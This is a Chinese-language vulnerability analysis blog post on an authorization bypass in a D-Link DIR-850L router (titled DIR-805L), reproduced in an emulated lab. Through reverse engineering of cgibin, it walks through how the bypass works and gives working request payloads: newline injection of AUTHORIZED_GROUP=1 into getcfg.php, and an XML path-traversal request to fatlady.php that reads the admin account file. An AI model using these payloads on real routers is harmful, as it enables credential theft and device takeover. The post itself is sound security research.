> 原文链接: https://www.anquanke.com//post/id/175625 


# 路由器漏洞挖掘之 DIR-805L 越权文件读取漏洞分析


                                阅读量   
                                **266005**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/dm/1024_501_/t01017cb10a6f512436.jpg)](https://p3.ssl.qhimg.com/dm/1024_501_/t01017cb10a6f512436.jpg)



接下来的文章都会实战复现一些关于路由器的 web /二进制漏洞，可能会写的比较细，希望能给大家带来启发。

## 前言

本文在复现 DIR-805L 任意文件读取漏洞时，将会比较详细的分析一下用于 cgi 处理的 `phpcgi_main` 函数其中的一些功能。在逆向 `cgibin` 二进制文件时，常常会遇到一些用于解析 http 请求的函数，在分析时经常对这些函数的用法不太清楚。总是云里雾里的，所以这里对这些函数做一个比较细致的总结，希望对同样在学这块的朋友们一点启发吧，也算是达到抛砖引玉的目的吧。
- 笔者能力有限，写不出高水平的文章，只能把基础的要点写详细一些，目的为了供一些和我一样的新手入门学习，文中若有解释错误恳请师傅们指出。


## 前提准备

去 dlink 的官网下载固件：

```
ftp://ftp2.dlink.com/PRODUCTS/DIR-850L/REVA/DIR-850L_REVA_FIRMWARE_1.14.B07_WW.ZIP
```

使用 firmadyne 来模拟固件：

```
./sources/extractor/extractor.py -b DIR-850L -sql 127.0.0.1 -np -nk "DIR-850L_REVA_FIRMWARE_1.14.B07_WW.ZIP" images

./scripts/getArch.sh ./images/8.tar.gz

./scripts/tar2db.py -i 8 -f ./images/8.tar.gz

sudo ./scripts/makeImage.sh 8

./scripts/inferNetwork.sh 8

./scratch/8/run.sh
```
<li>这里我使用远程的 vps 来搭建 firmadyne 的环境，路由器的 IP 是 `192.168.0.1`
</li>
[![](https://p1.ssl.qhimg.com/t011cb2fdfcb0d3c438.png)](https://p1.ssl.qhimg.com/t011cb2fdfcb0d3c438.png)

运行固件之后在本地连上远程的 ssh 隧道，代理到本地的 9000 端口：

```
ssh ubuntu@xx.xx.xx.xx -D 9000
```

sockets 代理 `127.0.0.1:9000` ，这里我们就能在本地访问到 vps 上模拟的固件

访问 `192.168.0.1` 即可访问到路由器的登录界面。

[![](https://p2.ssl.qhimg.com/t016e3d8adce1304332.png)](https://p2.ssl.qhimg.com/t016e3d8adce1304332.png)
- 如果用 Burp 访问的话，在 User options 中开启 socks proxy 选项就行了。
[![](https://p3.ssl.qhimg.com/t01e3bb31ce01877a42.png)](https://p3.ssl.qhimg.com/t01e3bb31ce01877a42.png)



## 越权文件读取

先给相应的 `payload`：

```
post_uri: http://192.168.0.1/getcfg.php
data: SERVICES=DEVICE.ACCOUNT&amp;attack=ture%0aAUTHORIZED_GROUP=1
```

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

#### <a class="reference-link" name="getcfg.php%20%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"></a>getcfg.php 源代码分析

在 `/htdocs/web/getcfg.php` 文件中，有一处文件读取的操作，通过读取 POST 传入的参数 `SERVICES` 的值，最后拼接到 `$file` 变量中，调用 `dophp("load", $file)` 函数进行文件读取。

[![](https://p1.ssl.qhimg.com/t01b30dcb9146aa1a2d.png)](https://p1.ssl.qhimg.com/t01b30dcb9146aa1a2d.png)

显然这里的 `SERVICES` 变量的值可控，为了达到读取文件的目的，**这里还需要绕过前面的一个 if 判断**

```
if(is_power_user() == 1)

    ......

    function is_power_user()`{`
        if($_GLOBALS["AUTHORIZED_GROUP"] == "")
        `{`
                return 0;
        `}`
        if($_GLOBALS["AUTHORIZED_GROUP"] &lt; 0)
        `{`
                return 0;
        `}`
        return 1;
`}`
```

这个函数在前面就定义了，通过全局变量 `AUTHORIZED_GROUP` 来判断返回值。这里需要满足 `AUTHORIZED_GROUP` 的值大于 0 才表示认证成功。那么这里全局变量 `AUTHORIZED_GROUP` 值是从哪里获取的呢？这里我们就需要在 `cgibin` 这个二进制文件中找到答案。

#### <a class="reference-link" name="cgibin%20%E7%9A%84%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"></a>cgibin 的静态分析

首先要明确 `cgibin` 这个文件是起到解析处理脚本语言的作用，当前 webserver 运行的是 php 脚本，那么**这个二进制文件中重点就是处理 php 语言的部分**，也就是 `phpcgi`。

> CGI的英文是（COMMON GATEWAY INTERFACE）公共网关接口，它的作用就是帮助服务器与语言通信。

所以在 IDA 中我们需要找到处理 `phpcgi` 的相关函数。在 0x00406528 处找到这个函数

[![](https://p5.ssl.qhimg.com/t01c58b0f15786e062d.png)](https://p5.ssl.qhimg.com/t01c58b0f15786e062d.png)

下面开始详细分析这个函数其中的一些细节。

首先，第一步函数调用了 `sobj_new、sobj_add_string、sobj_add_char` 函数来初始化字符串，为后面对解析 POST 变量的处理做一个准备。
- sobj_new 函数开辟一个堆内存，并维护一个数组
[![](https://p3.ssl.qhimg.com/t013ca58679f33626ec.png)](https://p3.ssl.qhimg.com/t013ca58679f33626ec.png)

```
int *malloc_addr = malloc(0x18)

heap + 0 = malloc_addr
heap + 4 = malloc_addr
heap + 8 = 0
heap + C = 0
heap + 10 = 0
heap + 14 = 0
```

接下来通过 `getenv` 函数来获取请求的方法和请求的 uri。

[![](https://p1.ssl.qhimg.com/t01db252a3fde687bec.png)](https://p1.ssl.qhimg.com/t01db252a3fde687bec.png)

这里是 POST 请求，所以会走到 `0x40668C` 这个分支

[![](https://p2.ssl.qhimg.com/t01398a7701dd7f08fa.png)](https://p2.ssl.qhimg.com/t01398a7701dd7f08fa.png)
<li>在 cgi 的处理中， `getenv` 是个很重要的函数，这个函数用来获取客户端通过 http 请求的一些请求参数，例如 uri、content-length、请求方法等。
<pre><code class="hljs cpp">char *getenv(const char *name)
</code></pre>
当前函数返回值为指向查找的 `name` 的值的指针。
</li>
> getenv 函数的返回值存储在一个全局二维数组里，当你再次使用 getenv 函数时不用担心会覆盖上次的调用结果。

[![](https://p2.ssl.qhimg.com/t01dea050342c15b0ef.png)](https://p2.ssl.qhimg.com/t01dea050342c15b0ef.png)

接着调用 `cgibin_parse_request` 这个函数，函数主要功能是进一步处理 http 请求。

```
cgibin_parse_request(sub_406220,malloc_addr,8)
```

这个函数的第一个参数 sub_406220 函数意思是拼接 POST 请求的参数名和参数值。

[![](https://p5.ssl.qhimg.com/t01e6bdfc97e55acb14.png)](https://p5.ssl.qhimg.com/t01e6bdfc97e55acb14.png)

接着 `cgibin_parse_request` 函数里调用 `parse_uri` 完后，将返回值存储到 &amp;(heap + 8) 处

往下就跳转到了 `loc_406760` 这个分支，`sobj_get_string` 函数从堆空间中获取前一步拼接的参数名和参数值，主要是判断 POST 请求中是否存在 `AUTHORIZED_GROUP` 这个参数

[![](https://p3.ssl.qhimg.com/t0179eff5863730aa1f.png)](https://p3.ssl.qhimg.com/t0179eff5863730aa1f.png)

继续往下，这里的开头先判断访问的绝对路径中是否包含 `htdocs/mydlink` 路径，再经过 `strcasecmp` 函数的比较之后，跳转到 `sess_validate` 函数来执行

[![](https://p5.ssl.qhimg.com/t014f7ba94dfaa98d63.png)](https://p5.ssl.qhimg.com/t014f7ba94dfaa98d63.png)

在这里，`sess_validate` 函数作用是验证解析 `AUTHORIZED_GROUP` 这个参数的值，并通过 `sprintf` 函数后**作为全局变量的形式格式化到栈上**。即：

```
sprintf($sp+0xB0-0x90,"AUTHORIZED_GROUP=%d",sess_validate())
```

[![](https://p3.ssl.qhimg.com/t01607ff900ad8b560a.png)](https://p3.ssl.qhimg.com/t01607ff900ad8b560a.png)

之后再调用 `sobj_add_string` 和 `sobj_add_char` 函数来进行字符串的拼接。

[![](https://p5.ssl.qhimg.com/t010d58c15f62df9cd0.png)](https://p5.ssl.qhimg.com/t010d58c15f62df9cd0.png)

`sobj_add_string` 函数将 `sprintf` 格式化到栈上的数据作为指针，存储到 `sobj_new` 开辟的堆空间里。

```
sobj_add_string(&amp;heap,$sp+0xB0-0x90)
```

这里需要在 POST 数据包中加上 `%0a` 的原因是在调用 `sobj_add_char` 函数时，会用 n 来分隔参数

```
sobj_add_char(heap,0x10)
```

因此这里的 `payload` 为：

```
SERVICES=DEVICE.ACCOUNT&amp;attack=%0aAUTHORIZED_GROUP=1
```

所以只要将 `%0aAUTHORIZED_GROUP=1` 伪造作为任意一个参数名的参数值就行了。

因此在 `cgibin` 处理完 `AUTHORIZED_GROUP` 参数后，就将他作为全局变量存储在 php 当中。这样就绕过了 `is_power_user` 函数的判断，执行下面的任意文件读取操作。

#### <a class="reference-link" name="%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90"></a>动态分析

这里直接使用 POST 方法提交上面的 payload 来进行调试，观察一下参数的变化。

### <a class="reference-link" name="%E5%8F%A6%E4%B8%80%E5%A4%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"></a>另一处任意文件读取

这里其实还有一处的任意文件读取，漏洞位于 `htdocs/webinc/fatlady.php` 中，代码如下：

[![](https://p4.ssl.qhimg.com/t01f6492dc625f44eb1.png)](https://p4.ssl.qhimg.com/t01f6492dc625f44eb1.png)

`$service` 参数未经过滤就直接拼接到 `$target` 变量中，导致这里可以通过**目录穿越**读取到其他目录下的 .php 后缀的文件，例如存放 admin 用户信息的 DEVICE.ACCOUNT.xml.php 文件。

```
&lt;?xml version "1.0" encoding "utf-8"&gt;&lt;postxml&gt;&lt;module&gt;&lt;service&gt;../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml&lt;/service&gt;&lt;/module&gt;&lt;/postxml&gt;
```

[![](https://p2.ssl.qhimg.com/t01912d8a2ccb4fb8b2.png)](https://p2.ssl.qhimg.com/t01912d8a2ccb4fb8b2.png)

这里只要满足 POST 数据包中 xml 形式的 `postxml` 即可，`$service` 变量即可控，同样可以达到任意文件读取的效果。
<li>注意这里请求头的 `Content-Type` 的值要为 `text/xml`
</li>
### <a class="reference-link" name="%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%A4%8D%E7%8E%B0"></a>任意文件读取漏洞的复现

这里复现一下第一种任意文件读取的效果，我们的目的是读取在 `/htdocs/webinc/getcfg` 目录下的 `DEVICE.ACCOUNT.xml.php` 文件。

[![](https://p5.ssl.qhimg.com/t01c0b4f57ea58c976f.png)](https://p5.ssl.qhimg.com/t01c0b4f57ea58c976f.png)

`SERVICES` 的值可控，那么这里就可以传入 `SERVICES` 的值为 `/htdocs/webinc/getcfg` 文件夹下后缀为 `.xml.php` 的文件名，达到未授权读取配置文件的目的。

使用 Burp 构造数据包发送即可看到漏洞效果。

[![](https://p4.ssl.qhimg.com/t01ff9a344561747b45.png)](https://p4.ssl.qhimg.com/t01ff9a344561747b45.png)
- 这里的 `Content-Type` 需要为 `application/x-www-form-urlencoded`，发送的 POST 数据才能正常被服务器解析。


## 总结

DIR-850L 任意文件读取复漏洞现重点还是要仔细分析 `phpcgi_main` 这个函数的在处理 http 请求时的相关逻辑。

这里在读取到 `DEVICE.ACCOUNT` 配置文件，得到 admin 的密码之后，可以进一步利用一处命令执行来 getshell，具体的后面的文章中会有具体的分析。



## 参考文章

[https://xz.aliyun.com/t/90](https://xz.aliyun.com/t/90)<br>[https://xz.aliyun.com/t/2941](https://xz.aliyun.com/t/2941)
